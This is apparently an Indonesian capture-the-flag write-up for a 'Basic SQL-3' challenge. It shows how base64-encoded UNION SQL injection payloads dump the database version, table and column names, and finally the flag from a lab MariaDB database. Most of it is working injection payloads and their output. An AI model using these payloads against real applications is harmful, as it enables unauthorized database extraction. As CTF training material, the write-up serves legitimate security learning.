<h1><b>Basic SQL-3</h1></b>
<pre>
Select Form (username)
</pre>
</b><h3>Solution</h3></b>
<p>Perhatikan URL ketika kita submit, disana terdapat encode base64 contohnya <b>YWRtaW4=</b> yang jika didecode itu merupakan <b>admin</b>, dan berikut hasil masing2 decode selection</p>
<pre>
YWRtaW4= --> admin
ZXJpY2s= --> erick
cm9iZXJ0 --> robert
YWxiZXJ0 --> albert
</pre>
<p align='justify'>Jika kita coba melakukan injection hasilnya null(tidak terjadi apa2), Sepertinya terdapat proses base64 decoding sebelum data input diterima oleh database MySQL, contohnya jika kita input <b>YWRtaW4n</b>
akan error karena yang kita input mengandung perintah injection yaitu <b></b></p>
<pre>
admin' |-->| YWRtaW4n
</pre>
<p align='justify'> sepertinya kondisi ini hanya berlaku menggunakan union injection, pertama cari banyak column pada table, dan jangan lupa encode ke base64 sebelum melakukan injection </p>
<pre>
1' union select 1,2 -- - |-->| MScgdW5pb24gc2VsZWN0IDEsMiAtLSAt 
1' union select 1,2,3 -- - |-->| MScgdW5pb24gc2VsZWN0IDEsMiwzIC0tIC0=
</pre>
<p align='justify'>Setalah mendapatkan seluruh nilai tanpa error, sekarang ganti setiap nilai menjadi setiap query, Lakukan injection lagi dan jangan lupa encode terlebih dahulu</p>

```mysql
MariaDB [CTF]> select version();
+-------------------+
| version()         |
+-------------------+
| 10.3.23-MariaDB-1 |
+-------------------+
1 row in set (0.000 sec)

MariaDB [CTF]> select database();
+------------+
| database() |
+------------+
| CTF        |
+------------+
1 row in set (0.000 sec)
```
<pre>
1' union select version(),database(),3 -- - |-->| MScgdW5pb24gc2VsZWN0IHZlcnNpb24oKSxkYXRhYmFzZSgpLDMgLS0gLQ==
</pre>
<p align='justify'>Dan mendapatkan version database yaitu 10.3.23-MariaDB-1 dan nama database yaitu CTF, selanjutnya lakukan injection untuk table dari database CTF</p>

```mysql
MariaDB [CTF]> select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='CTF';
+------------------------------------------------------------------------------------------------------------------+
| group_concat(TABLE_NAME)                                                                                         |
+------------------------------------------------------------------------------------------------------------------+
| *************************************,SQL_Challenge4,*********************************************************** |
+------------------------------------------------------------------------------------------------------------------+
1 row in set (0.000 sec)
```
<pre>
1' union select (select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA='CTF'),2,3# |-->| MScgdW5pb24gc2VsZWN0IChzZWxlY3QgZ3JvdXBfY29uY2F0KFRBQkxFX05BTUUpIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLlRBQkxFUyB3aGVyZSBUQUJMRV9TQ0hFTUE9J0NURicpLDIsMyM=
Hasilnya
SQL_Challenge4
</pre>
<p align='justify'>Setelah mendapatkan Table name, sekarang kita mencari column dari table yang sudah didapatkan</p>

```mysql
MariaDB [CTF]> select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='SQL_Challenge4';
+---------------------------+
| group_concat(COLUMN_NAME) |
+---------------------------+
| id,username,level         |
+---------------------------+
1 row in set (0.001 sec)
```
<pre>
1' union select (select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME='SQL_Challenge4'),2,3# |-->| MScgdW5pb24gc2VsZWN0IChzZWxlY3QgZ3JvdXBfY29uY2F0KENPTFVNTl9OQU1FKSBmcm9tIGluZm9ybWF0aW9uX3NjaGVtYS5DT0xVTU5TIHdoZXJlIFRBQkxFX05BTUU9J1NRTF9DaGFsbGVuZ2U0JyksMiwzIw==
Hasilnya
id,username,level
</pre>
<p>Selanjutnya Injection masing-masing field dengan nama column yang sudah didapatkan</p>
<pre>
1' union select (select id from SQL_Challenge4 limit 0,1),(select username from SQL_Challenge4 limit 0,1),(select level from SQL_Challenge4 limit 0,1)# |-->| MScgdW5pb24gc2VsZWN0IChzZWxlY3QgaWQgZnJvbSBTUUxfQ2hhbGxlbmdlNCBsaW1pdCAwLDEpLChzZWxlY3QgdXNlcm5hbWUgZnJvbSBTUUxfQ2hhbGxlbmdlNCBsaW1pdCAwLDEpLChzZWxlY3QgbGV2ZWwgZnJvbSBTUUxfQ2hhbGxlbmdlNCBsaW1pdCAwLDEpIw
Hasilnya
Your ID : 1 
Username : admin 
Group : administrator
</pre>
<p align='justify'>Jika limit 0,1 menghasilkan field admin, dan banyak field yaitu yang ditampilkan pada form sebanyak 3,3. Mari kita periksa field 4,4</p>

```mysql
MariaDB [CTF]> select id from SQL_Challenge4 limit 4,4;
+----------+
| id       |
+----------+
| 13371337 |
+----------+
1 row in set (0.000 sec)

MariaDB [CTF]> select username from SQL_Challenge4 limit 4,4;
+----------+
| username |
+----------+
| Venom    |
+----------+
1 row in set (0.000 sec)

MariaDB [CTF]> select level from SQL_Challenge4 limit 4,4;
+-----------------------------+
| level                       |
+-----------------------------+
| VenomCTF{Un10n_m4k3_me_cry} |
+-----------------------------+
1 row in set (0.000 sec)
```
<pre>
1' union select (select id from SQL_Challenge4 limit 4,4),(select username from SQL_Challenge4 limit 4,4),(select level from SQL_Challenge4 limit 4,4)# |-->| MScgdW5pb24gc2VsZWN0IChzZWxlY3QgaWQgZnJvbSBTUUxfQ2hhbGxlbmdlNCBsaW1pdCA0LDQpLChzZWxlY3QgdXNlcm5hbWUgZnJvbSBTUUxfQ2hhbGxlbmdlNCBsaW1pdCA0LDQpLChzZWxlY3QgbGV2ZWwgZnJvbSBTUUxfQ2hhbGxlbmdlNCBsaW1pdCA0LDQpIw==
Hasilnya
Your ID : 13371337
Username : Venom
Group : VenomCTF{Un10n_m4k3_me_cry}
</pre>
<p>Ternyata dugaan kita benar bahwa field 4,4 berisi flag</p>
</b><h3>Flag</h3></b>
<pre>
VenomCTF{Un10n_m4k3_me_cry}
</pre>
